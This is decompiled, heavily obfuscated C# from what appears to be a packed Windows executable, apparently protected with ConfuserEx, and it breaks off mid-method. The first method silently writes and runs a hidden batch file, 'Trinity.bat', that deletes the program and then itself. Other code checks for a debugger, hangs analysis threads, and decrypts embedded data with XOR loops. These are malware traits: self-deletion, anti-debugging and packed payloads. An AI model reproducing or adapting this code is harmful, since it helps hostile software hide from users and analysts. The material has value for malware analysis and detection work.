using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

// Token: 0x02000001 RID: 1
internal class <Module>
{
	// Token: 0x06000002 RID: 2 RVA: 0x00002B1C File Offset: 0x00000D1C
	private static void RegexPrefix()
	{
		<Module>.string_0 = string.Empty;
		<Module>.string_1 = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");
		<Module>.string_0 += "@ECHO OFF\n";
		<Module>.string_0 += "ping 127.0.0.1 > nul\n";
		<Module>.string_0 += "echo j | del /F ";
		<Module>.string_0 = <Module>.string_0 + <Module>.string_1 + "\n";
		<Module>.string_0 += "echo j | del Trinity.bat";
		File.WriteAllText("Trinity.bat", <Module>.string_0);
		new Process
		{
			StartInfo = 
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "Trinity.bat"
			}
		}.Start();
	}

	// Token: 0x06000003 RID: 3 RVA: 0x00002C14 File Offset: 0x00000E14
	private static void <SendFrameAsync>d__48()
	{
		/*
An exception occurred when decompiling this method (06000003)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void <Module>::<SendFrameAsync>d__48()
 ---> System.ArgumentOutOfRangeException: Требуется неотрицательное число.
Имя параметра: length
   в System.Array.Copy(Array sourceArray, Int32 sourceIndex, Array destinationArray, Int32 destinationIndex, Int32 length, Boolean reliable)
   в System.Array.Copy(Array sourceArray, Array destinationArray, Int32 length)
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 48
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 387
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 269
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 112
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 88
   --- Конец трассировки внутреннего стека исключений ---
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 92
   в ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:строка 1533
*/;
	}

	// Token: 0x06000004 RID: 4
	[DllImport("kernel32.dll")]
	private static extern bool CloseHandle(IntPtr intptr_0);

	// Token: 0x06000005 RID: 5
	[DllImport("kernel32.dll")]
	private static extern bool IsDebuggerPresent();

	// Token: 0x06000006 RID: 6
	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	private static extern int OutputDebugString(string string_6);

	// Token: 0x06000007 RID: 7 RVA: 0x00002CA0 File Offset: 0x00000EA0
	private static void StartMonitoringStreamForChanges(object object_0)
	{
		if (!(object_0 is Thread))
		{
			new Thread(new ParameterizedThreadStart(<Module>.StartMonitoringStreamForChanges))
			{
				IsBackground = true
			}.Start(Thread.CurrentThread);
			Thread.Sleep(500);
			goto IL_34;
		}
		goto IL_34;
		for (;;)
		{
			IL_34:
			goto IL_34;
		}
	}

	// Token: 0x06000008 RID: 8
	[DllImport("kernel32.dll")]
	internal unsafe static extern bool VirtualProtect(byte* pByte_13, int int_28, uint uint_10, ref uint uint_11);

	// Token: 0x06000009 RID: 9 RVA: 0x00002CE4 File Offset: 0x00000EE4
	internal static void set_Module()
	{
	}

	// Token: 0x17000002 RID: 2
	// (get) Token: 0x0600000A RID: 10 RVA: 0x00019458 File Offset: 0x00019458
	static extern int IsSystemFont { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] get; }

	// Token: 0x0600000B RID: 11 RVA: 0x00019490 File Offset: 0x00019490
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int LogonFlags(int int_28);

	// Token: 0x0600000C RID: 12 RVA: 0x000194B4 File Offset: 0x000194B4
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int GetAssemblyID(int int_28);

	// Token: 0x0600000D RID: 13 RVA: 0x000194E0 File Offset: 0x000194E0
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int HasObject(int int_28);

	// Token: 0x0600000E RID: 14 RVA: 0x00019518 File Offset: 0x00019518
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int TempAssemblyCache(int int_28);

	// Token: 0x0600000F RID: 15 RVA: 0x00019548 File Offset: 0x00019548
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int MapUrlToZone(int int_28);

	// Token: 0x06000010 RID: 16 RVA: 0x00019580 File Offset: 0x00019580
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int HadUndisplayableString(int int_28);

	// Token: 0x06000011 RID: 17 RVA: 0x000195C0 File Offset: 0x000195C0
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int TargetTypeToken(int int_28);

	// Token: 0x06000012 RID: 18 RVA: 0x000195E4 File Offset: 0x000195E4
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int TryRemove(int int_28);

	// Token: 0x17000003 RID: 3
	// (set) Token: 0x06000013 RID: 19 RVA: 0x00019618 File Offset: 0x00019618
	static extern int NewWidth { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] set; }

	// Token: 0x17000004 RID: 4
	// (get) Token: 0x06000014 RID: 20 RVA: 0x0001963C File Offset: 0x0001963C
	static extern int SelectionBullet { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] get; }

	// Token: 0x06000015 RID: 21 RVA: 0x0001966C File Offset: 0x0001966C
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int ArrowDirection(int int_28);

	// Token: 0x06000016 RID: 22 RVA: 0x00019698 File Offset: 0x00019698
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int <WriteEntityRefAsync>d__102(int int_28);

	// Token: 0x06000017 RID: 23 RVA: 0x000196D4 File Offset: 0x000196D4
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int ConstructorInfo(int int_28);

	// Token: 0x06000018 RID: 24 RVA: 0x000196F8 File Offset: 0x000196F8
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int add_BeginDrag(int int_28);

	// Token: 0x17000005 RID: 5
	// (get) Token: 0x06000019 RID: 25 RVA: 0x00019730 File Offset: 0x00019730
	static extern int OutputStream { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] get; }

	// Token: 0x0600001A RID: 26 RVA: 0x00002CF4 File Offset: 0x00000EF4
	internal static byte[] DataGridViewClipboardCopyMode(byte[] byte_1)
	{
		MemoryStream memoryStream = new MemoryStream(byte_1);
		<Module>.get_IsClosed get_IsClosed = new <Module>.get_IsClosed();
		byte[] buffer = new byte[5];
		memoryStream.Read(buffer, 0, 5);
		get_IsClosed.Invert(buffer);
		long num = 0L;
		for (int i = 0; i < 8; i++)
		{
			int num2 = memoryStream.ReadByte();
			num |= (long)((long)((ulong)((byte)num2)) << 8 * i);
		}
		byte[] array = new byte[(int)num];
		MemoryStream stream_ = new MemoryStream(array, true);
		long long_ = memoryStream.Length - 13L;
		get_IsClosed.ArrayWithOffset(memoryStream, stream_, long_, num);
		return array;
	}

	// Token: 0x0600001B RID: 27 RVA: 0x00002D88 File Offset: 0x00000F88
	internal static void add_Collapse()
	{
		uint num = 144U;
		uint[] array = new uint[]
		{
			2356142347U,
			1550614435U,
			4268417358U,
			1046546407U,
			2117724040U,
			1899509392U,
			2894302931U,
			2039692567U,
			3340014688U,
			804064803U,
			3269225219U,
			1156197126U,
			3824146730U,
			164729238U,
			2187707659U,
			2990839264U,
			1888678196U,
			1966668397U,
			1306511746U,
			1017916268U,
			2017556010U,
			1853775203U,
			3826750247U,
			2285835983U,
			3849800205U,
			1750206604U,
			2218495903U,
			1004444772U,
			1378031709U,
			2393073497U,
			2412421446U,
			2437330483U,
			1500201628U,
			277149436U,
			2914999922U,
			1393973070U,
			532476465U,
			2036786961U,
			2099227553U,
			1618854885U,
			1292781593U,
			1990301338U,
			3956368790U,
			670960198U,
			4119715795U,
			2052703917U,
			80450240U,
			3463213037U,
			567363513U,
			354655268U,
			2859304214U,
			1202044560U,
			1319766811U,
			3240174342U,
			1650508605U,
			4178551358U,
			4183613524U,
			4214359952U,
			4218286441U,
			392722257U,
			224228033U,
			571320902U,
			1412695422U,
			3713407964U,
			3940559320U,
			1895714787U,
			595364062U,
			716519904U,
			1582099585U,
			976872036U,
			2647821738U,
			3933239168U,
			1109118278U,
			3430120496U,
			3551506781U,
			2118589725U,
			3391263421U,
			4128394650U,
			3996051474U,
			3369317740U,
			1346328467U,
			3933647947U,
			3695018633U,
			10300841U,
			4138991973U,
			2190410270U,
			2406390781U,
			1404362296U,
			140440876U,
			1773042137U,
			2256861239U,
			917779886U,
			2179061576U,
			4023655946U,
			1572474878U,
			343226533U,
			4204551671U,
			1380412487U,
			839877142U,
			234037753U,
			3503458292U,
			1992784361U,
			1646133837U,
			780518602U,
			2662198239U,
			2091394512U,
			2269269107U,
			2008438553U,
			1312653824U,
			2885334259U,
			38278530U,
			247099493U,
			92133646U,
			3440852732U,
			3925309372U,
			21587939U,
			3243758774U,
			704294855U,
			855503393U,
			1321409785U,
			3216998679U,
			72195241U,
			927844254U,
			4079368080U,
			2187304887U,
			649764775U,
			2742685216U,
			3651315196U,
			3686646634U,
			3050023423U,
			3676561493U,
			3990918803U,
			2177223244U,
			704294855U,
			855503393U,
			1321409785U,
			3216998679U,
			72195241U,
			927844254U,
			4079368080U,
			2187304887U,
			649764775U,
			2742685216U,
			3651315196U
		};
		uint[] array2 = new uint[16];
		uint num2 = 2724579083U;
		for (int i = 0; i < 16; i++)
		{
			num2 ^= num2 >> 12;
			num2 ^= num2 << 25;
			num2 ^= num2 >> 27;
			array2[i] = num2;
		}
		int num3 = 0;
		int num4 = 0;
		uint[] array3 = new uint[16];
		byte[] array4 = new byte[num * 4U];
		while ((long)num3 < (long)((ulong)num))
		{
			for (int j = 0; j < 16; j++)
			{
				array3[j] = array[num3 + j];
			}
			array3[0] = (array3[0] ^ array2[0]);
			array3[1] = (array3[1] ^ array2[1]);
			array3[2] = (array3[2] ^ array2[2]);
			array3[3] = (array3[3] ^ array2[3]);
			array3[4] = (array3[4] ^ array2[4]);
			array3[5] = (array3[5] ^ array2[5]);
			array3[6] = (array3[6] ^ array2[6]);
			array3[7] = (array3[7] ^ array2[7]);
			array3[8] = (array3[8] ^ array2[8]);
			array3[9] = (array3[9] ^ array2[9]);
			array3[10] = (array3[10] ^ array2[10]);
			array3[11] = (array3[11] ^ array2[11]);
			array3[12] = (array3[12] ^ array2[12]);
			array3[13] = (array3[13] ^ array2[13]);
			array3[14] = (array3[14] ^ array2[14]);
			array3[15] = (array3[15] ^ array2[15]);
			for (int k = 0; k < 16; k++)
			{
				uint num5 = array3[k];
				array4[num4++] = (byte)num5;
				array4[num4++] = (byte)(num5 >> 8);
				array4[num4++] = (byte)(num5 >> 16);
				array4[num4++] = (byte)(num5 >> 24);
				array2[k] ^= num5;
			}
			num3 += 16;
		}
		<Module>.SetTextIndent = <Module>.DataGridViewClipboardCopyMode(array4);
	}

	// Token: 0x0600001C RID: 28 RVA: 0x00002F7C File Offset: 0x0000117C
	internal static T add_RenderToolStripPanelBackground<T>(uint uint_10, uint uint_11, string string_6)
	{
		uint_10 = (uint_10 * 2187971023U ^ 3715889707U);
		uint num = uint_10 >> 30;
		T result = default(T);
		uint_10 &= 1073741823U;
		uint_10 <<= 2;
		uint_11 &= 1073741823U;
		uint_11 <<= 2;
		if ((ulong)num != 2UL)
		{
			if ((ulong)num != 1UL)
			{
				if ((ulong)num == 3UL)
				{
					int num2 = (int)<Module>.SetTextIndent[(int)uint_10++] | (int)<Module>.SetTextIndent[(int)uint_10++] << 8 | (int)<Module>.SetTextIndent[(int)uint_10++] << 16 | (int)<Module>.SetTextIndent[(int)uint_10++] << 24;
					int length = (int)<Module>.SetTextIndent[(int)uint_10++] | (int)<Module>.SetTextIndent[(int)uint_10++] << 8 | (int)<Module>.SetTextIndent[(int)uint_10++] << 16 | (int)<Module>.SetTextIndent[(int)uint_10++] << 24;
					Array array = Array.CreateInstance(typeof(T).GetElementType(), length);
					Buffer.BlockCopy(<Module>.SetTextIndent, (int)uint_10, array, 0, num2 - 4);
					result = (T)((object)array);
					string_6 = uint_10.ToString();
				}
			}
			else
			{
				T[] array2 = new T[1];
				Buffer.BlockCopy(<Module>.SetTextIndent, (int)uint_10, array2, 0, sizeof(T));
				result = array2[0];
				string_6 = uint_10.ToString();
			}
		}
		else
		{
			int count = (int)<Module>.SetTextIndent[(int)uint_10++] | (int)<Module>.SetTextIndent[(int)uint_10++] << 8 | (int)<Module>.SetTextIndent[(int)uint_10++] << 16 | (int)<Module>.SetTextIndent[(int)uint_10++] << 24;
			result = (T)((object)string.Intern(Encoding.UTF8.GetString(<Module>.SetTextIndent, (int)uint_10, count)));
			string_6 = uint_10.ToString();
		}
		return result;
	}

	// Token: 0x0600001D RID: 29 RVA: 0x0000313C File Offset: 0x0000133C
	internal static T GetDelegateParameters<T>(uint uint_10, uint uint_11, string string_6)
	{
		uint_10 = (uint_10 * 820811397U ^ 210872739U);
		uint num = uint_10 >> 30;
		T result = default(T);
		uint_10 &= 1073741823U;
		uint_10 <<= 2;
		uint_11 &= 1073741823U;
		uint_11 <<= 2;
		if ((ulong)num == 0UL)
		{
			int count = (int)<Module>.SetTextIndent[(int)uint_10++] | (int)<Module>.SetTextIndent[(int)uint_10++] << 8 | (int)<Module>.SetTextIndent[(int)uint_10++] << 16 | (int)<Module>.SetTextIndent[(int)uint_10++] << 24;
			result = (T)((object)string.Intern(Encoding.UTF8.GetString(<Module>.SetTextIndent, (int)uint_10, count)));
			string_6 = uint_10.ToString();
		}
		else if ((ulong)num != 2UL)
		{
			if ((ulong)num == 1UL)
			{
				int num2 = (int)<Module>.SetTextIndent[(int)uint_10++] | (int)<Module>.SetTextIndent[(int)uint_10++] << 8 | (int)<Module>.SetTextIndent[(int)uint_10++] << 16 | (int)<Module>.SetTextIndent[(int)uint_10++] << 24;
				int length = (int)<Module>.SetTextIndent[(int)uint_10++] | (int)<Module>.SetTextIndent[(int)uint_10++] << 8 | (int)<Module>.SetTextIndent[(int)uint_10++] << 16 | (int)<Module>.SetTextIndent[(int)uint_10++] << 24;
				Array array = Array.CreateInstance(typeof(T).GetElementType(), length);
				Buffer.BlockCopy(<Module>.SetTextIndent, (int)uint_10, array, 0, num2 - 4);
				result = (T)((object)array);
				string_6 = uint_10.ToString();
			}
		}
		else
		{
			T[] array2 = new T[1];
			Buffer.BlockCopy(<Module>.SetTextIndent, (int)uint_10, array2, 0, sizeof(T));
			result = array2[0];
			string_6 = uint_10.ToString();
		}
		return result;
	}

	// Token: 0x0600001E RID: 30 RVA: 0x000032FC File Offset: 0x000014FC
	internal static T AssemblyReferenceDependentAssemblyEntryFieldId<T>(uint uint_10, uint uint_11, string string_6)
	{
		uint_10 = (uint_10 * 4079606673U ^ 2290793968U);
		uint num = uint_10 >> 30;
		T result = default(T);
		uint_10 &= 1073741823U;
		uint_10 <<= 2;
		uint_11 &= 1073741823U;
		uint_11 <<= 2;
		if ((ulong)num == 0UL)
		{
			int count = (int)<Module>.SetTextIndent[(int)uint_10++] | (int)<Module>.SetTextIndent[(int)uint_10++] << 8 | (int)<Module>.SetTextIndent[(int)uint_10++] << 16 | (int)<Module>.SetTextIndent[(int)uint_10++] << 24;
			result = (T)((object)string.Intern(Encoding.UTF8.GetString(<Module>.SetTextIndent, (int)uint_10, count)));
			string_6 = uint_10.ToString();
		}
		else if ((ulong)num != 1UL)
		{
			if ((ulong)num == 3UL)
			{
				int num2 = (int)<Module>.SetTextIndent[(int)uint_10++] | (int)<Module>.SetTextIndent[(int)uint_10++] << 8 | (int)<Module>.SetTextIndent[(int)uint_10++] << 16 | (int)<Module>.SetTextIndent[(int)uint_10++] << 24;
				int length = (int)<Module>.SetTextIndent[(int)uint_10++] | (int)<Module>.SetTextIndent[(int)uint_10++] << 8 | (int)<Module>.SetTextIndent[(int)uint_10++] << 16 | (int)<Module>.SetTextIndent[(int)uint_10++] << 24;
				Array array = Array.CreateInstance(typeof(T).GetElementType(), length);
				Buffer.BlockCopy(<Module>.SetTextIndent, (int)uint_10, array, 0, num2 - 4);
				result = (T)((object)array);
				string_6 = uint_10.ToString();
			}
		}
		else
		{
			T[] array2 = new T[1];
			Buffer.BlockCopy(<Module>.SetTextIndent, (int)uint_10, array2, 0, sizeof(T));
			result = array2[0];
			string_6 = uint_10.ToString();
		}
		return result;
	}

	// Token: 0x0600001F RID: 31 RVA: 0x000034BC File Offset: 0x000016BC
	internal static T ShouldOverrideFieldName<T>(uint uint_10, uint uint_11, string string_6)
	{
		uint_10 = (uint_10 * 3541238233U ^ 1080332754U);
		uint num = uint_10 >> 30;
		T result = default(T);
		uint_10 &= 1073741823U;
		uint_10 <<= 2;
		uint_11 &= 1073741823U;
		uint_11 <<= 2;
		if ((ulong)num == 0UL)
		{
			int count = (int)<Module>.SetTextIndent[(int)uint_10++] | (int)<Module>.SetTextIndent[(int)uint_10++] << 8 | (int)<Module>.SetTextIndent[(int)uint_10++] << 16 | (int)<Module>.SetTextIndent[(int)uint_10++] << 24;
			result = (T)((object)string.Intern(Encoding.UTF8.GetString(<Module>.SetTextIndent, (int)uint_10, count)));
			string_6 = uint_10.ToString();
		}
		else if ((ulong)num == 2UL)
		{
			T[] array = new T[1];
			Buffer.BlockCopy(<Module>.SetTextIndent, (int)uint_10, array, 0, sizeof(T));
			result = array[0];
			string_6 = uint_10.ToString();
		}
		else if ((ulong)num == 3UL)
		{
			int num2 = (int)<Module>.SetTextIndent[(int)uint_10++] | (int)<Module>.SetTextIndent[(int)uint_10++] << 8 | (int)<Module>.SetTextIndent[(int)uint_10++] << 16 | (int)<Module>.SetTextIndent[(int)uint_10++] << 24;
			int length = (int)<Module>.SetTextIndent[(int)uint_10++] | (int)<Module>.SetTextIndent[(int)uint_10++] << 8 | (int)<Module>.SetTextIndent[(int)uint_10++] << 16 | (int)<Module>.SetTextIndent[(int)uint_10++] << 24;
			Array array2 = Array.CreateInstance(typeof(T).GetElementType(), length);
			Buffer.BlockCopy(<Module>.SetTextIndent, (int)uint_10, array2, 0, num2 - 4);
			result = (T)((object)array2);
			string_6 = uint_10.ToString();
		}
		return result;
	}

	// Token: 0x06000020 RID: 32 RVA: 0x00003678 File Offset: 0x00001878
	internal static T SetAccessRule<T>(uint uint_10, uint uint_11, string string_6)
	{
		uint_10 = (uint_10 * 358976797U ^ 1854550253U);
		uint num = uint_10 >> 30;
		T result = default(T);
		uint_10 &= 1073741823U;
		uint_10 <<= 2;
		uint_11 &= 1073741823U;
		uint_11 <<= 2;
		if ((ulong)num == 0UL)
		{
			int count = (int)<Module>.SetTextIndent[(int)uint_10++] | (int)<Module>.SetTextIndent[(int)uint_10++] << 8 | (int)<Module>.SetTextIndent[(int)uint_10++] << 16 | (int)<Module>.SetTextIndent[(int)uint_10++] << 24;
			result = (T)((object)string.Intern(Encoding.UTF8.GetString(<Module>.SetTextIndent, (int)uint_10, count)));
			string_6 = uint_10.ToString();
		}
		else if ((ulong)num == 1UL)
		{
			T[] array = new T[1];
			Buffer.BlockCopy(<Module>.SetTextIndent, (int)uint_10, array, 0, sizeof(T));
			result = array[0];
			string_6 = uint_10.ToString();
		}
		else if ((ulong)num == 2UL)
		{
			int num2 = (int)<Module>.SetTextIndent[(int)uint_10++] | (int)<Module>.SetTextIndent[(int)uint_10++] << 8 | (int)<Module>.SetTextIndent[(int)uint_10++] << 16 | (int)<Module>.SetTextIndent[(int)uint_10++] << 24;
			int length = (int)<Module>.SetTextIndent[(int)uint_10++] | (int)<Module>.SetTextIndent[(int)uint_10++] << 8 | (int)<Module>.SetTextIndent[(int)uint_10++] << 16 | (int)<Module>.SetTextIndent[(int)uint_10++] << 24;
			Array array2 = Array.CreateInstance(typeof(T).GetElementType(), length);
			Buffer.BlockCopy(<Module>.SetTextIndent, (int)uint_10, array2, 0, num2 - 4);
			result = (T)((object)array2);
			string_6 = uint_10.ToString();
		}
		return result;
	}

	// Token: 0x06000021 RID: 33 RVA: 0x00003838 File Offset: 0x00001A38
	internal static void remove_MouseLeave()
	{
		uint num = 432U;
		uint[] array = new uint[]
		{
			2387403980U,
			3797587690U,
			4266362001U,
			4067063489U,
			927933480U,
			592165432U,
			1991598155U,
			3876170229U,
			834151139U,
			4081992435U,
			411535212U,
			3669144092U,
			30152907U,
			70528829U,
			2292633802U,
			3798669551U,
			3381210045U,
			3232849601U,
			67795668U,
			2162503538U,
			1489972524U,
			3860190722U,
			3731449119U,
			3137583314U,
			2297015676U,
			3535677263U,
			5898610U,
			3350903248U,
			3715543450U,
			728045625U,
			1898973028U,
			2736129545U,
			2527193973U,
			4028561086U,
			667115485U,
			2538868035U,
			1612580052U,
			1708175487U,
			2771582646U,
			346426525U,
			973512859U,
			3760070643U,
			919870538U,
			1932779651U,
			1435376390U,
			28235196U,
			133178636U,
			3604496702U,
			1011287748U,
			3602637902U,
			121353285U,
			925921981U,
			2931907534U,
			3660020131U,
			2039569378U,
			4054397212U,
			1534426484U,
			2481837609U,
			3882586982U,
			2595505657U,
			917907481U,
			236609667U,
			3466544279U,
			4161563746U,
			1187919090U,
			871510213U,
			822529980U,
			4021418440U,
			2601186024U,
			3965837309U,
			3962305058U,
			3741192865U,
			600948801U,
			2092159221U,
			1017251051U,
			2038661465U,
			2733625470U,
			959453096U,
			4122850253U,
			617018045U,
			492315509U,
			1203428419U,
			3882962790U,
			997047698U,
			3811198446U,
			1358361720U,
			1899338194U,
			3673624092U,
			2796157303U,
			2427115304U,
			3331314680U,
			483209644U,
			1321293447U,
			2690908036U,
			11728226U,
			344351735U,
			3868012711U,
			3793652792U,
			3860903547U,
			4097353387U,
			2764938724U,
			251809667U,
			1758283270U,
			848962931U,
			2980615048U,
			50639735U,
			3770536430U,
			1951147575U,
			1623775394U,
			3060156220U,
			3890756783U,
			3627378937U,
			3681990032U,
			647252023U,
			937232614U,
			643547735U,
			931654956U,
			1775905019U,
			2649274514U,
			4200575103U,
			3585724758U,
			1747758023U,
			1614493449U,
			2209227090U,
			2445543850U,
			4155612610U,
			1841789063U,
			2570085481U,
			1129716620U,
			2007824676U,
			4157431156U,
			3167301597U,
			3579971870U,
			2283684459U,
			426718247U,
			3721049480U,
			2020114466U,
			1707993209U,
			1224855846U,
			615768712U,
			2365831309U,
			593256625U,
			1336312503U,
			2867110815U,
			3002219151U,
			373974932U,
			1682813441U,
			809694920U,
			3684156009U,
			372586405U,
			282107975U,
			957751792U,
			1768959545U,
			2161395641U,
			565063945U,
			455042135U,
			1459061793U,
			3167767707U,
			3695043167U,
			141221824U,
			2650250017U,
			2024562912U,
			953534679U,
			807963097U,
			1200901525U,
			522946459U,
			4200021497U,
			3694090981U,
			2427750768U,
			3815309098U,
			1200233710U,
			1729330U,
			4181839973U,
			3623692831U,
			750615709U,
			1598024235U,
			3453380846U,
			137312562U,
			1228295503U,
			1912629451U,
			3993931290U,
			2328452208U,
			253989424U,
			641079432U,
			3973636626U,
			2427524787U,
			396255940U,
			1275616086U,
			1410420957U,
			3344336523U,
			3390763531U,
			1896162820U,
			3207823485U,
			2598570102U,
			3772630875U,
			4287093721U,
			4245332832U,
			1547631069U,
			1212904963U,
			3096250434U,
			1725229194U,
			1800013553U,
			3203929906U,
			1509643694U,
			1996594185U,
			2874117236U,
			3361474284U,
			2457984656U,
			1613124866U,
			2616869318U,
			3729155228U,
			1580124813U,
			592943426U,
			3096057607U,
			4095168965U,
			2636800922U,
			149507754U,
			2165776402U,
			3272159852U,
			3143809534U,
			683317335U,
			2592227582U,
			3442492974U,
			2056591898U,
			1258163000U,
			868924845U,
			4273021144U,
			1088476198U,
			2731138879U,
			2757100066U,
			1513055135U,
			4079109061U,
			2312961327U,
			3055310713U,
			3127920233U,
			3791614875U,
			1374471917U,
			3010294435U,
			4294758582U,
			3561326346U,
			4285227602U,
			300429122U,
			2515210067U,
			956172865U,
			3515108019U,
			632238687U,
			434363461U,
			3615745539U,
			784364909U,
			122467192U,
			35482684U,
			3490607733U,
			1345716353U,
			3590867392U,
			3612187695U,
			2196749632U,
			1041005618U,
			350985613U,
			3347059659U,
			1151441069U,
			1664338467U,
			2587346224U,
			2652089427U,
			256367477U,
			1108520712U,
			2608599555U,
			424400557U,
			3394654024U,
			2132829807U,
			2515004363U,
			2656120661U,
			146205570U,
			1580458213U,
			2516598604U,
			2271146792U,
			565637055U,
			732927653U,
			3376589528U,
			1500868836U,
			4265960436U,
			371491196U,
			3592915030U,
			1006895030U,
			2969100870U,
			3248808322U,
			888110873U,
			963673306U,
			842420742U,
			1382241925U,
			613286644U,
			2524394279U,
			1308688186U,
			3867296582U,
			532411033U,
			227567391U,
			2615949349U,
			1333310507U,
			3713905217U,
			3434927714U,
			566935146U,
			3582397081U,
			2466742273U,
			1625945670U,
			2612513141U,
			357806980U,
			3081064185U,
			2528942041U,
			2373980270U,
			2309712595U,
			813687367U,
			2828605895U,
			1531553957U,
			607784163U,
			4006425357U,
			2586941831U,
			4148985128U,
			99447516U,
			6489079U,
			793088555U,
			670021338U,
			1322711469U,
			3560769926U,
			975736169U,
			1828370129U,
			1198689641U,
			897790077U,
			3741949527U,
			194790267U,
			542788546U,
			1975726677U,
			2050883687U,
			925338452U,
			176073704U,
			3267415041U,
			1738582958U,
			997210502U,
			269609030U,
			778088923U,
			913008187U,
			2811850692U,
			2952024972U,
			2346148943U,
			3165014450U,
			2624345645U,
			3658183244U,
			3281191980U,
			243945195U,
			2308882761U,
			4033404456U,
			2566504091U,
			2642414222U,
			1792624545U,
			2757504162U,
			2985679605U,
			1755194876U,
			3094404239U,
			565132863U,
			2422441501U,
			1954229649U,
			745822551U,
			3745118921U,
			1768538042U,
			4131520010U,
			1238785307U,
			1889102201U,
			1185717621U,
			764758617U,
			2817361265U,
			2692260189U,
			3786162619U,
			1164539338U,
			3478363314U,
			3551522269U,
			432246030U,
			2907997213U,
			2817653852U,
			2054882494U,
			3925795961U,
			2562520494U,
			1340218917U,
			1636205642U,
			3967451877U,
			2259302627U,
			751330398U,
			2972829334U,
			2959046986U,
			1901973555U,
			4089505816U,
			3325605050U,
			347492174U,
			4154230367U,
			2845654895U,
			1276118880U,
			1178524369U,
			3235362727U,
			1375757105U,
			83068230U,
			2656790076U,
			2510059676U,
			1978966409U,
			3937350446U,
			2431792439U,
			2881221213U,
			4126353276U,
			1679928962U,
			1360307442U,
			2544786810U,
			288738U,
			3427339037U,
			3674739186U,
			4030834905U,
			1966936172U,
			1276124438U,
			2562152918U,
			1731972055U,
			3710377944U,
			1091363096U,
			2423742278U,
			2881221213U,
			4126353276U,
			1679928962U,
			1360307442U,
			2544786810U,
			288738U,
			3427339037U,
			3674739186U,
			4030834905U,
			1966936172U,
			1276124438U,
			2562152918U,
			1731972055U,
			3710377944U
		};
		uint[] array2 = new uint[16];
		uint num2 = 776836860U;
		for (int i = 0; i < 16; i++)
		{
			num2 ^= num2 >> 13;
			num2 ^= num2 << 25;
			num2 ^= num2 >> 27;
			array2[i] = num2;
		}
		int num3 = 0;
		int num4 = 0;
		uint[] array3 = new uint[16];
		byte[] array4 = new byte[num * 4U];
		while ((long)num3 < (long)((ulong)num))
		{
			for (int j = 0; j < 16; j++)
			{
				array3[j] = array[num3 + j];
			}
